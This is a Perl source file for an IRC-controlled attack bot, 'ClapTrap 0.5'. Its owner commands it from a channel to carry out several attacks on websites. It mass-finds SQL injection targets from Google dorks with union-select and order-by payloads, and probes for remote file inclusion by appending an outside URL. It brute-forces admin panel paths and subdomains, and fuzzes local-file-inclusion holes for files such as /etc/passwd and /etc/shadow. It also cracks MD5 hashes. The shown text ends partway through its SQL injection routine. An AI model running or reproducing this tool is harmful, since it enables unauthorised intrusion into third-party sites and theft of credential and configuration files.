#!usr/bin/perl
#ClapTrap IRC Bot 0.5
#(C) Doddy Hackman 2014
#
#Commands to use :
#
#!sqli <page>
#!lfi <page>
#!panel <page>
#!locateip <web>
#!sqlifinder <page>
#!rfifinder <page>
#!crackit <hash>
#!tinyurl <page>
#!httpfinger <page>
#!md5 <text>
#!base64 <encode/decode> <string>
#!hex <encode/decode> <string>
#!ascii <encode/decode> <string>
#!help
#
#Thanks to Aceitunas & Explorer (perlenespanol)
#

use IO::Socket;
use LWP::UserAgent;
use HTML::LinkExtor;
use URI::Split qw(uri_split);
use Digest::MD5 qw(md5_hex);

my @dns = (
    'www',         'www1',        'www2',         'www3',
    'ftp',         'ns',          'mail',         '3com',
    'aix',         'apache',      'back',         'bind',
    'boreder',     'bsd',         'business',     'chains',
    'cisco',       'content',     'corporate',    'cpv',
    'dns',         'domino',      'dominoserver', 'download',
    'e-mail',      'e-safe',      'email',        'esafe',
    'external',    'extranet',    'firebox',      'firewall',
    'front',       'fw',          'fw0',          'fwe',
    'fw-1',        'firew',       'gate',         'gatekeeper',
    'gateway',     'gauntlet',    'group',        'help',
    'hop',         'hp',          'hpjet',        'hpux',
    'http',        'https',       'hub',          'ibm',
    'ids',         'info',        'inside',       'internal',
    'internet',    'intranet',    'ipfw',         'irix',
    'jet',         'list',        'lotus',        'lotusdomino',
    'lotusnotes',  'lotusserver', 'mailfeed',     'mailgate',
    'mailgateway', 'mailgroup',   'mailhost',     'maillist',
    'mailpop',     'mailrelay',   'mimesweeper',  'ms',
    'msproxy',     'mx',          'nameserver',   'news',
    'newsdesk',    'newsfeed',    'newsgroup',    'newsroom',
    'newsserver',  'nntp',        'notes',        'noteserver',
    'notesserver', 'nt',          'outside',      'pix',
    'pop',         'pop3',        'pophost',      'popmail',
    'popserver',   'print',       'printer',      'private',
    'proxy',       'proxyserver', 'public',       'qpop',
    'raptor',      'read',        'redcreek',     'redhat',
    'route',       'router',      'scanner',      'screen',
    'screening',   's#ecure',     'seek',         'smail',
    'smap',        'smtp',        'smtpgateway',  'smtpgw',
    'solaris',     'sonic',       'spool',        'squid',
    'sun',         'sunos',       'suse',         'switch',
    'transfer',    'trend',       'trendmicro',   'vlan',
    'vpn',         'wall',        'web',          'webmail',
    'webserver',   'webswitch',   'win2000',      'win2k',
    'upload',      'file',        'fileserver',   'storage',
    'backup',      'share',       'core',         'gw',
    'wingate',     'main',        'noc',          'home',
    'radius',      'security',    'access',       'dmz',
    'domain',      'sql',         'mysql',        'mssql',
    'postgres',    'db',          'database',     'imail',
    'imap',        'exchange',    'sendmail',     'louts',
    'test',        'logs',        'stage',        'staging',
    'dev',         'devel',       'ppp',          'chat',
    'irc',         'eng',         'admin',        'unix',
    'linux',       'windows',     'apple',        'hp-ux',
    'bigip',       'pc'
);

my @panels = (
    'admin/admin.asp',               'admin/login.asp',
    'admin/index.asp',               'admin/admin.aspx',
    'admin/login.aspx',              'admin/index.aspx',
    'admin/webmaster.asp',           'admin/webmaster.aspx',
    'asp/admin/index.asp',           'asp/admin/index.aspx',
    'asp/admin/admin.asp',           'asp/admin/admin.aspx',
    'asp/admin/webmaster.asp',       'asp/admin/webmaster.aspx',
    'admin/',                        'login.asp',
    'login.aspx',                    'admin.asp',
    'admin.aspx',                    'webmaster.aspx',
    'webmaster.asp',                 'login/index.asp',
    'login/index.aspx',              'login/login.asp',
    'login/login.aspx',              'login/admin.asp',
    'login/admin.aspx',              'administracion/index.asp',
    'administracion/index.aspx',     'administracion/login.asp',
    'administracion/login.aspx',     'administracion/webmaster.asp',
    'administracion/webmaster.aspx', 'administracion/admin.asp',
    'administracion/admin.aspx',     'php/admin/',
    'admin/admin.php',               'admin/index.php',
    'admin/login.php',               'admin/system.php',
    'admin/ingresar.php',            'admin/administrador.php',
    'admin/default.php',             'administracion/',
    'administracion/index.php',      'administracion/login.php',
    'administracion/ingresar.php',   'administracion/admin.php',
    'administration/',               'administration/index.php',
    'administration/login.php',      'administrator/index.php',
    'administrator/login.php',       'administrator/system.php',
    'system/',                       'system/login.php',
    'admin.php',                     'login.php',
    'administrador.php',             'administration.php',
    'administrator.php',             'admin1.html',
    'admin1.php',                    'admin2.php',
    'admin2.html',                   'yonetim.php',
    'yonetim.html',                  'yonetici.php',
    'yonetici.html',                 'adm/',
    'admin/account.php',             'admin/account.html',
    'admin/index.html',              'admin/login.html',
    'admin/home.php',                'admin/controlpanel.html',
    'admin/controlpanel.php',        'admin.html',
    'admin/cp.php',                  'admin/cp.html',
    'cp.php',                        'cp.html',
    'administrator/',                'administrator/index.html',
    'administrator/login.html',      'administrator/account.html',
    'administrator/account.php',     'administrator.html',
    'login.html',                    'modelsearch/login.php',
    'moderator.php',                 'moderator.html',
    'moderator/login.php',           'moderator/login.html',
    'moderator/admin.php',           'moderator/admin.html',
    'moderator/',                    'account.php',
    'account.html',                  'controlpanel/',
    'controlpanel.php',              'controlpanel.html',
    'admincontrol.php',              'admincontrol.html',
    'adminpanel.php',                'adminpanel.html',
    'admin1.asp',                    'admin2.asp',
    'yonetim.asp',                   'yonetici.asp',
    'admin/account.asp',             'admin/home.asp',
    'admin/controlpanel.asp',        'admin/cp.asp',
    'cp.asp',                        'administrator/index.asp',
    'administrator/login.asp',       'administrator/account.asp',
    'administrator.asp',             'modelsearch/login.asp',
    'moderator.asp',                 'moderator/login.asp',
    'moderator/admin.asp',           'account.asp',
    'controlpanel.asp',              'admincontrol.asp',
    'adminpanel.asp',                'fileadmin/',
    'fileadmin.php',                 'fileadmin.asp',
    'fileadmin.html',                'administration.html',
    'sysadmin.php',                  'sysadmin.html',
    'phpmyadmin/',                   'myadmin/',
    'sysadmin.asp',                  'sysadmin/',
    'ur-admin.asp',                  'ur-admin.php',
    'ur-admin.html',                 'ur-admin/',
    'Server.php',                    'Server.html',
    'Server.asp',                    'Server/',
    'wp-admin/',                     'administr8.php',
    'administr8.html',               'administr8/',
    'administr8.asp',                'webadmin/',
    'webadmin.php',                  'webadmin.asp',
    'webadmin.html',                 'administratie/',
    'admins/',                       'admins.php',
    'admins.asp',                    'admins.html',
    'administrivia/',                'Database_Administration/',
    'WebAdmin/',                     'useradmin/',
    'sysadmins/',                    'admin1/',
    'system-administration/',        'administrators/',
    'pgadmin/',                      'directadmin/',
    'staradmin/',                    'ServerAdministrator/',
    'SysAdmin/',                     'administer/',
    'LiveUser_Admin/',               'sys-admin/',
    'typo3/',                        'panel/',
    'cpanel/',                       'cPanel/',
    'cpanel_file/',                  'platz_login/',
    'rcLogin/',                      'blogindex/',
    'formslogin/',                   'autologin/',
    'support_login/',                'meta_login/',
    'manuallogin/',                  'simpleLogin/',
    'loginflat/',                    'utility_login/',
    'showlogin/',                    'memlogin/',
    'members/',                      'login-redirect/',
    'sub-login/',                    'wp-login/',
    'login1/',                       'dir-login/',
    'login_db/',                     'xlogin/',
    'smblogin/',                     'customer_login/',
    'UserLogin/',                    'login-us/',
    'acct_login/',                   'admin_area/',
    'bigadmin/',                     'project-admins/',
    'phppgadmin/',                   'pureadmin/',
    'sql-admin/',                    'radmind/',
    'openvpnadmin/',                 'wizmysqladmin/',
    'vadmind/',                      'ezsqliteadmin/',
    'hpwebjetadmin/',                'newsadmin/',
    'adminpro/',                     'Lotus_Domino_Admin/',
    'bbadmin/',                      'vmailadmin/',
    'Indy_admin/',                   'ccp14admin/',
    'irc-macadmin/',                 'banneradmin/',
    'sshadmin/',                     'phpldapadmin/',
    'macadmin/',                     'administratoraccounts/',
    'admin4_account/',               'admin4_colon/',
    'radmind-1/',                    'Super-Admin/',
    'AdminTools/',                   'cmsadmin/',
    'SysAdmin2/',                    'globes_admin/',
    'cadmins/',                      'phpSQLiteAdmin/',
    'navSiteAdmin/',                 'server_admin_small/',
    'logo_sysadmin/',                'server/',
    'database_administration/',      'power_user/',
    'system_administration/',        'ss_vms_admin_sm/'
);

my @buscar3 = (
    '../../../boot.ini',
    '../../../../boot.ini',
    '../../../../../boot.ini',
    '../../../../../../boot.ini',
    '/etc/passwd',
    '/etc/shadow',
    '/etc/shadow~',
    '/etc/hosts',
    '/etc/motd',
    '/etc/apache/apache.conf',
    '/etc/fstab',
    '/etc/apache2/apache2.conf',
    '/etc/apache/httpd.conf',
    '/etc/httpd/conf/httpd.conf',
    '/etc/apache2/httpd.conf',
    '/etc/apache2/sites-available/default',
    '/etc/mysql/my.cnf',
    '/etc/my.cnf',
    '/etc/sysconfig/network-scripts/ifcfg-eth0',
    '/etc/redhat-release',
    '/etc/httpd/conf.d/php.conf',
    '/etc/pam.d/proftpd',
    '/etc/phpmyadmin/config.inc.php',
    '/var/www/config.php',
    '/etc/httpd/logs/error_log',
    '/etc/httpd/logs/error.log',
    '/etc/httpd/logs/access_log',
    '/etc/httpd/logs/access.log',
    '/var/log/apache/error_log',
    '/var/log/apache/error.log',
    '/var/log/apache/access_log',
    '/var/log/apache/access.log',
    '/var/log/apache2/error_log',
    '/var/log/apache2/error.log',
    '/var/log/apache2/access_log',
    '/var/log/apache2/access.log',
    '/var/www/logs/error_log',
    '/var/www/logs/error.log',
    '/var/www/logs/access_log',
    '/var/www/logs/access.log',
    '/usr/local/apache/logs/error_log',
    '/usr/local/apache/logs/error.log',
    '/usr/local/apache/logs/access_log',
    '/usr/local/apache/logs/access.log',
    '/var/log/error_log',
    '/var/log/error.log',
    '/var/log/access_log',
    '/var/log/access.log',
    '/etc/group',
    '/etc/security/group',
    '/etc/security/passwd',
    '/etc/security/user',
    '/etc/security/environ',
    '/etc/security/limits',
    '/usr/lib/security/mkuser.default',
    '/apache/logs/access.log',
    '/apache/logs/error.log',
    '/etc/httpd/logs/acces_log',
    '/etc/httpd/logs/acces.log',
    '/var/log/httpd/access_log',
    '/var/log/httpd/error_log',
    '/apache2/logs/error.log',
    '/apache2/logs/access.log',
    '/logs/error.log',
    '/logs/access.log',
    '/usr/local/apache2/logs/access_log',
    '/usr/local/apache2/logs/access.log',
    '/usr/local/apache2/logs/error_log',
    '/usr/local/apache2/logs/error.log',
    '/var/log/httpd/access.log',
    '/var/log/httpd/error.log',
    '/opt/lampp/logs/access_log',
    '/opt/lampp/logs/error_log',
    '/opt/xampp/logs/access_log',
    '/opt/xampp/logs/error_log',
    '/opt/lampp/logs/access.log',
    '/opt/lampp/logs/error.log',
    '/opt/xampp/logs/access.log',
    '/opt/xampp/logs/error.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log',
    'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log',
    '/usr/local/apache/conf/httpd.conf',
    '/usr/local/apache2/conf/httpd.conf',
    '/etc/apache/conf/httpd.conf',
    '/usr/local/etc/apache/conf/httpd.conf',
    '/usr/local/apache/httpd.conf',
    '/usr/local/apache2/httpd.conf',
    '/usr/local/httpd/conf/httpd.conf',
    '/usr/local/etc/apache2/conf/httpd.conf',
    '/usr/local/etc/httpd/conf/httpd.conf',
    '/usr/apache2/conf/httpd.conf',
    '/usr/apache/conf/httpd.conf',
    '/usr/local/apps/apache2/conf/httpd.conf',
    '/usr/local/apps/apache/conf/httpd.conf',
    '/etc/apache2/conf/httpd.conf',
    '/etc/http/conf/httpd.conf',
    '/etc/httpd/httpd.conf',
    '/etc/http/httpd.conf',
    '/etc/httpd.conf',
    '/opt/apache/conf/httpd.conf',
    '/opt/apache2/conf/httpd.conf',
    '/var/www/conf/httpd.conf',
    '/private/etc/httpd/httpd.conf',
    '/private/etc/httpd/httpd.conf.default',
    '/Volumes/webBackup/opt/apache2/conf/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf',
    '/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
    'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf',
    'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf',
    'C:\ProgramFiles\xampp\apache\conf\httpd.conf',
    '/usr/local/php/httpd.conf.php',
    '/usr/local/php4/httpd.conf.php',
    '/usr/local/php5/httpd.conf.php',
    '/usr/local/php/httpd.conf',
    '/usr/local/php4/httpd.conf',
    '/usr/local/php5/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
    '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
    '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
    '/usr/local/etc/apache/vhosts.conf',
    '/etc/php.ini',
    '/bin/php.ini',
    '/etc/httpd/php.ini',
    '/usr/lib/php.ini',
    '/usr/lib/php/php.ini',
    '/usr/local/etc/php.ini',
    '/usr/local/lib/php.ini',
    '/usr/local/php/lib/php.ini',
    '/usr/local/php4/lib/php.ini',
    '/usr/local/php5/lib/php.ini',
    '/usr/local/apache/conf/php.ini',
    '/etc/php4.4/fcgi/php.ini',
    '/etc/php4/apache/php.ini',
    '/etc/php4/apache2/php.ini',
    '/etc/php5/apache/php.ini',
    '/etc/php5/apache2/php.ini',
    '/etc/php/php.ini',
    '/etc/php/php4/php.ini',
    '/etc/php/apache/php.ini',
    '/etc/php/apache2/php.ini',
    '/web/conf/php.ini',
    '/usr/local/Zend/etc/php.ini',
    '/opt/xampp/etc/php.ini',
    '/var/local/www/conf/php.ini',
    '/etc/php/cgi/php.ini',
    '/etc/php4/cgi/php.ini',
    '/etc/php5/cgi/php.ini',
    'c:\php5\php.ini',
    'c:\php4\php.ini',
    'c:\php\php.ini',
    'c:\PHP\php.ini',
    'c:\WINDOWS\php.ini',
    'c:\WINNT\php.ini',
    'c:\apache\php\php.ini',
    'c:\xampp\apache\bin\php.ini',
    'c:\NetServer\bin\stable\apache\php.ini',
    'c:\home2\bin\stable\apache\php.ini',
    'c:\home\bin\stable\apache\php.ini',
    '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
    '/usr/local/cpanel/logs',
    '/usr/local/cpanel/logs/stats_log',
    '/usr/local/cpanel/logs/access_log',
    '/usr/local/cpanel/logs/error_log',
    '/usr/local/cpanel/logs/license_log',
    '/usr/local/cpanel/logs/login_log',
    '/var/cpanel/cpanel.config',
    '/var/log/mysql/mysql-bin.log',
    '/var/log/mysql.log',
    '/var/log/mysqlderror.log',
    '/var/log/mysql/mysql.log',
    '/var/log/mysql/mysql-slow.log',
    '/var/mysql.log',
    '/var/lib/mysql/my.cnf',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\data\hostname.err',
    'C:\ProgramFiles\MySQL\data\mysql.log',
    'C:\ProgramFiles\MySQL\data\mysql.err',
    'C:\ProgramFiles\MySQL\data\mysql-bin.log',
    'C:\MySQL\data\hostname.err',
    'C:\MySQL\data\mysql.log',
    'C:\MySQL\data\mysql.err',
    'C:\MySQL\data\mysql-bin.log',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini',
    'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf',
    'C:\ProgramFiles\MySQL\my.ini',
    'C:\ProgramFiles\MySQL\my.cnf',
    'C:\MySQL\my.ini',
    'C:\MySQL\my.cnf',
    '/etc/logrotate.d/proftpd',
    '/www/logs/proftpd.system.log',
    '/var/log/proftpd',
    '/etc/proftp.conf',
    '/etc/protpd/proftpd.conf',
    '/etc/vhcs2/proftpd/proftpd.conf',
    '/etc/proftpd/modules.conf',
    '/var/log/vsftpd.log',
    '/etc/vsftpd.chroot_list',
    '/etc/logrotate.d/vsftpd.log',
    '/etc/vsftpd/vsftpd.conf',
    '/etc/vsftpd.conf',
    '/etc/chrootUsers',
    '/var/log/xferlog',
    '/var/adm/log/xferlog',
    '/etc/wu-ftpd/ftpaccess',
    '/etc/wu-ftpd/ftphosts',
    '/etc/wu-ftpd/ftpusers',
    '/usr/sbin/pure-config.pl',
    '/usr/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.conf',
    '/usr/local/etc/pure-ftpd.conf',
    '/usr/local/etc/pureftpd.pdb',
    '/usr/local/pureftpd/etc/pureftpd.pdb',
    '/usr/local/pureftpd/sbin/pure-config.pl',
    '/usr/local/pureftpd/etc/pure-ftpd.conf',
    '/etc/pure-ftpd/pure-ftpd.pdb',
    '/etc/pureftpd.pdb',
    '/etc/pureftpd.passwd',
    '/etc/pure-ftpd/pureftpd.pdb',
    '/var/log/pure-ftpd/pure-ftpd.log',
    '/logs/pure-ftpd.log',
    '/var/log/pureftpd.log',
    '/var/log/ftp-proxy/ftp-proxy.log',
    '/var/log/ftp-proxy',
    '/var/log/ftplog',
    '/etc/logrotate.d/ftp',
    '/etc/ftpchroot',
    '/etc/ftphosts',
    '/var/log/exim_mainlog',
    '/var/log/exim/mainlog',
    '/var/log/maillog',
    '/var/log/exim_paniclog',
    '/var/log/exim/paniclog',
    '/var/log/exim/rejectlog',
    '/var/log/exim_rejectlog'
);

my $nave = LWP::UserAgent->new();
$nave->timeout(5);
$nave->agent(
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
);

my $servidor;
my $canal;
my $nick;
my $port;
my $lider;
my $soquete;

head();

unless ( -f "config.txt" ) {

    print "\n[+] Server : ";
    chomp( my $server = <stdin> );
    print "\n[+] Port : ";
    chomp( my $port = <stdin> );
    print "\n[+] Channel : ";
    chomp( my $canal = <stdin> );
    print "\n[+] Your Nick : ";
    chomp( my $nickz = <stdin> );

    savefile( "config.txt", "server=" . $server );
    savefile( "config.txt", "canal=" . $canal );
    savefile( "config.txt", "puerto=" . $port );
    savefile( "config.txt", "nick=" . $nickz );

    print "\n[+] Installed ...\n\n";

}

my $codez = abrir();
my $tengo_server;
my $tengo_canal;
my $tengo_puerto;
my $tengo_nick;

my $control;

if ( $codez =~ /server=(.*)/ ) {
    $tengo_server = $1;
}

if ( $codez =~ /canal=(.*)/ ) {
    $tengo_canal = $1;
}

if ( $codez =~ /puerto=(.*)/ ) {
    $tengo_puerto = $1;
}

if ( $codez =~ /nick=(.*)/ ) {
    $tengo_nick = $1;
}

$servidor = $tengo_server;
$canal    = $tengo_canal;
$nick     = "ClapTrap";
$port     = $tengo_puerto;
$lider    = $tengo_nick;

party();

sub party {

    print "[+] Starting the bot\n";

    $soquete = new IO::Socket::INET(
        PeerAddr => $servidor,
        PeerPort => $port,
        Proto    => 'tcp'
    );

    if ( !$soquete ) {
        print "\n[-] Error\n";
        exit 1;
    }

    print $soquete "NICK $nick\r\n";
    print $soquete "USER $nick 1 1 1 1\r\n";
    print $soquete "JOIN $canal\r\n";

    print "[+] Online\n\n";

    while ( my $log = <$soquete> ) {
        chomp($log);

        if ( $log =~ /^PING(.*)$/i ) {
            print $soquete "PONG $1\r\n";
        }

        if ( $log =~ /:(.*)!(.*) PRIVMSG (.*) :(.*)/ ) {
            if ( $1 eq $lider ) {
                $control = 1;
            }
            else {
                $control = "Fuck You";
            }
        }

        if ( $control eq 1 ) {

            if ( $log =~ m/:!help/g ) {
                print $soquete
"PRIVMSG $canal : Hi , I am ClapTrap an assistant robot programmed by Doddy Hackman in the year 2014\r\n";
                print $soquete "PRIVMSG $canal : [++] Commands\r\n";
                print $soquete "PRIVMSG $canal : [+] !help\r\n";
                print $soquete "PRIVMSG $canal : [+] !locateip <web>\r\n";
                print $soquete "PRIVMSG $canal : [+] !sqlifinder <dork>\r\n";
                print $soquete "PRIVMSG $canal : [+] !rfifinder <dork>\r\n";
                print $soquete "PRIVMSG $canal : [+] !panel <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !sqli <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !fuzzdns <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !lfi <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !crackit <hash>\r\n";
                print $soquete "PRIVMSG $canal : [+] !tinyurl <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !httpfinger <page>\r\n";
                print $soquete "PRIVMSG $canal : [+] !md5 <text>\r\n";
                print $soquete
                  "PRIVMSG $canal : [+] !base64 <encode/decode> <text>\r\n";
                print $soquete
                  "PRIVMSG $canal : [+] !ascii <encode/decode> <text>\r\n";
                print $soquete
                  "PRIVMSG $canal : [+] !hex <encode/decode> <text> \r\n";
                print $soquete "PRIVMSG $canal : [++] Enjoy this IRC Bot\r\n";
            }

            #print $log."\n";

            if ( $log =~ m/:!crackit/ ) {

                $log =~ /:(.*)!(.*)\sPRIVMSG\s(.*)\s:(.*)\s(.*)\s(.*)/;

                if ( $4 == "!crackit" ) {

                    my $hash = $5;

                    print $soquete "PRIVMSG $canal : [+] Working ...\r\n";

                    my $re = crackit($hash);
                    unless ( $re =~ /false01/ ) {
                        print $soquete "PRIVMSG $canal : [+] MD5 : $re\r\n";
                    }
                    else {
                        print $soquete
                          "PRIVMSG $canal : [-] Hash not Found\r\n";
                    }
                    
                    print $soquete "PRIVMSG $canal : [+] Finished\r\n";

                }

            }

            if ( $log =~ m/:!panel (.*)\// ) {

                my $page = $1;
                chomp $page;
                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                scan($page);
                print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";

            }

            if ( $log =~ m/:!md5 (.*)$/ ) {

                my $text = $1;
                chomp $text;

                print $soquete "PRIVMSG $canal : [+] MD5 : "
                  . md5_hex($text) . "\r\n";

            }

            if ( $log =~ m/:!httpfinger (.*)$/g ) {

                my $page = $1;

                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";

                my $coded = $nave->get($page);

                print $soquete "PRIVMSG $canal : [+] Date : "
                  . $coded->header('date') . "\r\n";
                print $soquete "PRIVMSG $canal : [+] Server : "
                  . $coded->header('server') . "\r\n";
                print $soquete "PRIVMSG $canal : [+] Connection : "
                  . $coded->header('connection') . "\r\n";
                print $soquete "PRIVMSG $canal : [+] Content-Type : "
                  . $coded->header('content-type') . "\r\n";

                print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";
            }

            if ( $log =~ m/:!tinyurl (.*)$/g ) {
                my $page = $1;

                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";

                my $code =
                  toma( "http://tinyurl.com/api-create.php?url=" . $page );

                unless ( $code =~ /Error/ig ) {
                    print $soquete "PRIVMSG $canal : [+] Link : $code\r\n";
                }
                else {
                    print $soquete "PRIVMSG $canal : [-] Error\r\n";
                }

            }

            if ( $log =~ m/:!locateip (.*)\//g ) {

                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                infocon($1);
                print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";

            }

            if ( $log =~ m/:!sqlifinder (.*)$/g ) {

                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                my $dork = $1;
                my @paginas = &google( $dork, "30" );    # 30 EDIT
                print $soquete "PRIVMSG $canal : [+] SQL Scan Started\r\n";
                print $soquete "PRIVMSG $canal : [+] Searching pages\r\n";
                print $soquete "PRIVMSG $canal : [Webs Count] : "
                  . int(@paginas) . "\r\n";
                print $soquete "PRIVMSG $canal : [Status] : Scanning\r\n";

                for my $page (@paginas) {
                    my ( $pass1, $pass2 ) = ( "+", "--" );
                    $code1 =
                      toma( $page . "-1"
                          . $pass1 . "union"
                          . $pass1
                          . "select"
                          . $pass1 . "666"
                          . $pass2 );
                    if ( $code1 =~
/The used SELECT statements have a different number of columns/ig
                      )
                    {
                        print $soquete "PRIVMSG $canal : [+] SQLI : $page\r\n";
                    }
                }
                print $soquete "PRIVMSG $canal : [+] Finished\r\n";
            }

            if ( $log =~ m/:!rfifinder (.*)$/g ) {

                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                my $dork = $1;
                my @paginas = &google( $dork, "30" );    # 30 EDIT
                print $soquete "PRIVMSG $canal : [+] RFI Scan Started\r\n";
                print $soquete "PRIVMSG $canal : [+] Searching pages\r\n";
                print $soquete "PRIVMSG $canal : [Webs Count] : "
                  . int(@paginas) . "\r\n";
                print $soquete "PRIVMSG $canal : [Status] : Scanning\r\n";

                for my $page (@paginas) {
                    $code1 = toma( $page . "http:/www.supertangas.com/" );
                    if ( $code1 =~ /Los mejores TANGAS de la red/ig )
                    {    #Esto es conocimiento de verdad xDDD
                        print $soquete "PRIVMSG $canal : [+] RFI : $page\r\n";
                    }
                }
                print $soquete "PRIVMSG $canal : [+] Finished\r\n";
            }

            if ( $log =~ m/:!sqli (.*)$/g ) {
                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                print $soquete "PRIVMSG $canal : [+] SQL Scan Starting\r\n";
                scan2($1);
            }

            if ( $log =~ m/:!fuzzdns (.*)$/g ) {
                print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                scan1($1);
                print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";
            }

            if ( $log =~ m/:!lfi/ ) {

                $log =~ /:(.*)!(.*)\sPRIVMSG\s(.*)\s:(.*)\s(.*)\s(.*)/;

                if ( $4 eq "!lfi" ) {

                    my $page = $5;

                    print $soquete "PRIVMSG $canal : [+] Working ...\r\n";
                    lfi($page);
                    print $soquete "PRIVMSG $canal : [+] Scan Finished\r\n";
                }
            }

            if ( $log =~ m/:!base64 (.*) (.*)$/g ) {
                use MIME::Base64;
                my ( $opcion, $aa ) = ( $1, $2 );
                chop $aa;
                if ( $opcion eq "encode" ) {
                    print $soquete "PRIVMSG $canal : [+] Text : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Encode : "
                      . encode_base64($aa) . "\r\n";
                }
                elsif ( $opcion eq "decode" ) {
                    print $soquete "PRIVMSG $canal : [+] Encode : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Text : "
                      . decode_base64($aa) . "\r\n";
                }
                else {
                    print $soquete "PRIVMSG $canal : ??\r\n";
                }
            }

            if ( $log =~ m/:!ascii (.*) (.*)$/ ) {
                my ( $opcion, $aa ) = ( $1, $2 );
                chop $aa;
                if ( $opcion eq "encode" ) {
                    print $soquete "PRIVMSG $canal : [+] Text : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Encode : "
                      . ascii($aa) . "\r\n";
                }
                elsif ( $opcion eq "decode" ) {
                    print $soquete "PRIVMSG $canal : [+] Encode : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Text : "
                      . ascii_de($aa) . "\r\n";
                }
                else {
                    print $soquete "PRIVMSG $canal : ???\r\n";
                }
            }

            if ( $log =~ m/:!hex (.*) (.*)$/ ) {
                my ( $opcion, $aa ) = ( $1, $2 );
                chop $aa;
                if ( $opcion eq "encode" ) {
                    print $soquete "PRIVMSG $canal : [+] Text : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Encode : "
                      . encode($aa) . "\r\n";
                }
                elsif ( $opcion eq "decode" ) {
                    print $soquete "PRIVMSG $canal : [+] Encode : $aa\r\n";
                    print $soquete "PRIVMSG $canal : [+] Text : "
                      . decode($aa) . "\r\n";
                }
                else {
                    print $soquete "PRIVMSG $canal : ????\r\n";
                }
            }
        }

        sub lfi {

            print $soquete "PRIVMSG $canal : [+] Status : [scanning]" . "\r\n";

            $code = toma( $_[0] . "'" );
            if ( $code =~ /No such file or directory in <b>(.*)<\/b> on line/ig
                or $code =~
/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/ig
              )
            {
                print $soquete "PRIVMSG $canal : [+] Vulnerable !" . "\r\n";
                print $soquete
                  "PRIVMSG $canal : [*] Full path discloure detected : $1"
                  . "\r\n";
                print $soquete "PRIVMSG $canal : [+] Status : [fuzzing files]"
                  . "\r\n";
                for my $file (@buscar3) {
                    $code1 = toma( $_[0] . $file );
                    unless ( $code1 =~
                        /No such file or directory in <b>(.*)<\/b> on line/ig
                        or $code =~
/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/ig
                      )
                    {
                        $ok = 1;
                        print $soquete "PRIVMSG $canal : [File Found] : "
                          . $_[0]
                          . $file . "\r\n";
                    }
                }
                unless ( $ok == 1 ) {
                    print $soquete "PRIVMSG $canal : [-] Dont found any file"
                      . "\r\n";
                }
            }
            else {
                print $soquete
                  "PRIVMSG $canal : [-] Page not vulnerable to LFI" . "\r\n";
            }
        }

        sub scan1 {
            print $soquete "PRIVMSG $canal : [*] Searching DNS to "
              . $_[0] . "\r\n";
            for my $path (@dns) {
                $code = tomax( "http://" . $path . "." . $_[0] );
                if ( $code->is_success ) {
                    print $soquete "PRIVMSG $canal : http://"
                      . $path . "."
                      . $_[0] . "\r\n";
                }
            }
        }

        sub scan {
            my $page = shift;
            chomp $page;
            print $soquete "PRIVMSG $canal [*] Searching panels to "
              . $page . "\r\n";

            for my $path (@panels) {
                $code = tomados( $page . "/" . $path );
                if ( $code->is_success ) {
                    print "\a";
                    $ct = 1;
                    print $soquete "PRIVMSG $canal [Link] : "
                      . $page . "/"
                      . $path . "\r\n";
                }
            }
            if ( $ct ne 1 ) {
                print $soquete "PRIVMSG $canal [-] Not found any path\r\n";
            }
        }

        sub scan2 {

            my $rows = "0";
            my $asc;
            my $page = $_[0];

            ( $pass1, $pass2 ) = &bypass( $ARGV[1] );
            $inyection =
                $page . "-1"
              . $pass1 . "order"
              . $pass1 . "by"
              . "9999999999"
              . $pass2;
            $code = toma($inyection);
            if ( $code =~
/supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig
                || $code =~ /mysql_free_result/ig
                || $code =~ /mysql_fetch_assoc/ig
                || $code =~ /mysql_num_rows/ig
                || $code =~ /mysql_fetch_array/ig
